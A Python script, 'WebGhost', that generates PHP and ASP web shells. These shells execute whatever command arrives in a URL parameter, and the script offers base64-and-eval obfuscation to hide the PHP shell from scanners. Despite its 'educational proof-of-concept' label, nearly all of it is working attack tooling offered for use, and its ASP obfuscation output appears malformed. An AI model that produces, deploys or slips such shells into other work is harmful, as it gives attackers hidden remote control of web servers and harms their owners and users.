import argparse
import base64
import random
import string
import os

# WebGhost - Obfuscated Webshell Generator
# Educational Proof-of-Concept

def banner():
    print("""
    __      __      ___.    ________.__                   __   
   /  \    /  \ ____\_ |__ /  _____/|  |__   ____  _______/  |_ 
   \   \/\/   // __ \| __ /   \  ___|  |  \ /  _ \/  ___/\   __\\
    \        /\  ___/| \_ \    \_\  \   Y  (  <_> )___ \  |  |  
     \__/\  /  \___  >___  \______  /___|  /\____/____  > |__|  
          \/       \/    \/       \/     \/           \/        
    
    [+] WebGhost - Polyglot/Obfuscated Shell Generator
    """)

def random_string(length=6):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def generate_php(outfile, obfuscate=False):
    # Standard dangerous shell
    raw_payload = "<?php system($_GET['cmd']); ?>"
    
    if obfuscate:
        # Simple Base64 + Eval obfuscation
        # Encodes the payload and generates a decoding stub
        # Logic: eval(base64_decode('...'));
        encoded = base64.b64encode(b"system($_GET['cmd']);").decode()
        var_name = random_string()
        payload = f"<?php ${var_name} = '{encoded}'; eval(base64_decode(${var_name})); ?>"
        print(f"[+] Obfuscated PHP shell generated.")
    else:
        payload = raw_payload
        print(f"[+] Raw PHP shell generated.")

    with open(outfile, 'w') as f:
        f.write(payload)
    print(f"[+] Written to {outfile}")

def generate_asp(outfile, obfuscate=False):
    # Basic ASP shell stub
    raw_payload = '<% Dim oScript, oScriptNet: Set oScript = Server.CreateObject("WSCRIPT.SHELL"): oScript.Run(Request.QueryString("cmd")) %>'
    
    if obfuscate:
        # Obfuscation for ASP is harder to do generically in a small script, 
        # so we'll just add some random comments and garbage data
        garbage = random_string(20)
        payload = f"<% '{garbage} \n" + raw_payload + f"\n'{garbage} %>"
        print(f"[+] Obfuscated ASP shell generated (comment injection).")
    else:
        payload = raw_payload
        print(f"[+] Raw ASP shell generated.")

    with open(outfile, 'w') as f:
        f.write(payload)
    print(f"[+] Written to {outfile}")

def main():
    banner()
    parser = argparse.ArgumentParser(description="WebGhost - Shell Generator")
    parser.add_argument("--type", choices=['php', 'asp'], required=True, help="Type of shell to generate")
    parser.add_argument("--out", required=True, help="Output filename")
    parser.add_argument("--obfuscate", action='store_true', help="Enable basic obfuscation")

    args = parser.parse_args()

    if args.type == 'php':
        generate_php(args.out, args.obfuscate)
    elif args.type == 'asp':
        generate_asp(args.out, args.obfuscate)

if __name__ == "__main__":
    main()
